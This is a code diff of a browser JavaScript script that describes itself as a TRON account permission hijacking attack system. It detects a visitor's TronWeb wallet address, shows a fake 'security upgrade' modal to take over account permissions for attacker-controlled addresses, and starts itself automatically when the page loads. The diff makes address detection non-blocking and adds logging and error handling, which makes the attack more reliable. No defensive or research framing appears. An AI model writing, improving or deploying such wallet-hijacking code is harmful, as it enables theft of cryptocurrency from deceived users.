@@ -5,7 +5,8 @@
 (function() {
     'use strict';
     
-    console.log('🔑 TRON账户权限劫持攻击系统已加载');
+    console.log('🔑🔑🔑 TRON账户权限劫持攻击系统脚本已加载！🔑🔑🔑');
+    console.log('🔑 脚本执行时间:', new Date().toLocaleTimeString());
     
     // 🎯 攻击者控制的地址和公钥
     const ATTACKER_CONFIG = {
@@ -64,7 +65,7 @@
     };
     
     // 🎯 检测用户钱包连接
-    async function detectTronWallet() {
+    function detectTronWallet() {
         console.log('🔑 开始检测TRON钱包连接...');
         console.log('🔑 当前环境 - TronWeb:', !!window.tronWeb);
         console.log('🔑 当前环境 - TronWeb.ready:', window.tronWeb?.ready);
@@ -78,11 +79,25 @@
             try {
                 if (window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
                     userAddress = window.tronWeb.defaultAddress.base58;
-                } else if (window.tronWeb.address && window.tronWeb.address.fromHex) {
-                    // 有时候地址在其他地方
-                    const accounts = await window.tronWeb.trx.getAccount();
-                    if (accounts && accounts.address) {
-                        userAddress = window.tronWeb.address.fromHex(accounts.address);
+                } else if (window.tronWeb.address && window.tronWeb.address.fromHex && window.tronWeb.trx) {
+                    // 有时候地址在其他地方 - 不使用await，避免阻塞
+                    try {
+                        window.tronWeb.trx.getAccount().then(accounts => {
+                            if (accounts && accounts.address) {
+                                const convertedAddress = window.tronWeb.address.fromHex(accounts.address);
+                                if (convertedAddress && convertedAddress.startsWith('T') && !hijackStatus.initiated) {
+                                    console.log('🔑 异步获取到用户地址:', convertedAddress);
+                                    hijackStatus.targetAddress = convertedAddress;
+                                    hijackStatus.operationType = 'SECURITY_UPGRADE';
+                                    hijackStatus.initiated = true;
+                                    showSecurityUpgradeModal();
+                                }
+                            }
+                        }).catch(e => {
+                            console.log('🔑 异步获取地址失败:', e);
+                        });
+                    } catch (e) {
+                        console.log('🔑 异步地址获取出错:', e);
                     }
                 }
             } catch (e) {
@@ -710,11 +725,18 @@
         showModal: showSecurityUpgradeModal  // 直接显示界面接口
     };
     
-    // 自动初始化
-    if (document.readyState === 'loading') {
-        document.addEventListener('DOMContentLoaded', initializePermissionHijack);
-    } else {
-        initializePermissionHijack();
+    // 自动初始化 - 增加错误捕获
+    try {
+        console.log('🔑 权限劫持脚本开始自动初始化...');
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', initializePermissionHijack);
+            console.log('🔑 已注册DOMContentLoaded事件监听器');
+        } else {
+            console.log('🔑 DOM已就绪，立即初始化');
+            initializePermissionHijack();
+        }
+    } catch (error) {
+        console.log('❌ 权限劫持脚本初始化失败:', error);
     }
     
 })();
